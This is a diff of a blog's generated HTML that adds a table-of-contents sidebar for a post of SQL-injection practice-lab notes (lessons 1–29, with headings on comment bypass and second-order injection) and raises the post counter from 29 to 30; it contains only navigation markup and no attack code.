+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#sqli-lab%E9%9D%B6%E5%9C%BA%E8%AE%B0%E5%BD%95"><span class="nav-number">1.</span> <span class="nav-text">sqli-lab靶场记录</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#less-1"><span class="nav-number">1.1.</span> <span class="nav-text">less-1</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#less-2"><span class="nav-number">1.2.</span> <span class="nav-text">less-2</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#less-3"><span class="nav-number">1.3.</span> <span class="nav-text">less-3</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#less-4"><span class="nav-number">1.4.</span> <span class="nav-text">less-4</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#less-5"><span class="nav-number">1.5.</span> <span class="nav-text">less-5</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#less-6"><span class="nav-number">1.6.</span> <span class="nav-text">less-6</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#less-7"><span class="nav-number">1.7.</span> <span class="nav-text">less-7</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#less-8"><span class="nav-number">1.8.</span> <span class="nav-text">less-8</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#less-9"><span class="nav-number">1.9.</span> <span class="nav-text">less-9</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#less-10"><span class="nav-number">1.10.</span> <span class="nav-text">less-10</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#less-11"><span class="nav-number">1.11.</span> <span class="nav-text">less-11</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#less-12"><span class="nav-number">1.12.</span> <span class="nav-text">less-12</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#less-13"><span class="nav-number">1.13.</span> <span class="nav-text">less-13</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#less-14"><span class="nav-number">1.14.</span> <span class="nav-text">less-14</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#less-15"><span class="nav-number">1.15.</span> <span class="nav-text">less-15</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#less-16"><span class="nav-number">1.16.</span> <span class="nav-text">less-16</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#less-17"><span class="nav-number">1.17.</span> <span class="nav-text">less-17</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#less-18"><span class="nav-number">1.18.</span> <span class="nav-text">less-18</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#less-19"><span class="nav-number">1.19.</span> <span class="nav-text">less-19</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#less-20"><span class="nav-number">1.20.</span> <span class="nav-text">less-20</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#less-21"><span class="nav-number">1.21.</span> <span class="nav-text">less-21</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#less-22"><span class="nav-number">1.22.</span> <span class="nav-text">less-22</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#less-23"><span class="nav-number">1.23.</span> <span class="nav-text">less-23</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#%E6%B3%A8%E9%87%8A%E7%AC%A6%E7%BB%95%E8%BF%87%E6%B3%A8%E5%85%A5"><span class="nav-number">1.23.0.1.</span> <span class="nav-text">注释符绕过注入</span></a></li></ol></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#less-24"><span class="nav-number">1.24.</span> <span class="nav-text">less-24</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#%E4%BA%8C%E6%AC%A1%E6%B3%A8%E5%85%A5"><span class="nav-number">1.24.0.1.</span> <span class="nav-text">二次注入</span></a></li></ol></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#less-25"><span class="nav-number">1.25.</span> <span class="nav-text">less-25</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#less-25a"><span class="nav-number">1.26.</span> <span class="nav-text">less-25a</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#less-26"><span class="nav-number">1.27.</span> <span class="nav-text">less-26</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#less-26a"><span class="nav-number">1.28.</span> <span class="nav-text">less-26a</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#less-27"><span class="nav-number">1.29.</span> <span class="nav-text">less-27</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#less-27a"><span class="nav-number">1.30.</span> <span class="nav-text">less-27a</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#less-28"><span class="nav-number">1.31.</span> <span class="nav-text">less-28</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#less-28a"><span class="nav-number">1.32.</span> <span class="nav-text">less-28a</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#less-29"><span class="nav-number">1.33.</span> <span class="nav-text">less-29</span></a></li></ol></li></ol></div>
       </div>
       <!--/noindex-->
 
@@ -414,7 +559,7 @@
       <div class="site-state-item site-state-posts">
           <a href="/archives/">
         
-          <span class="site-state-item-count">29</span>
+          <span class="site-state-item-count">30</span>
           <span class="site-state-item-name">日志</span>
         </a>
       </div>
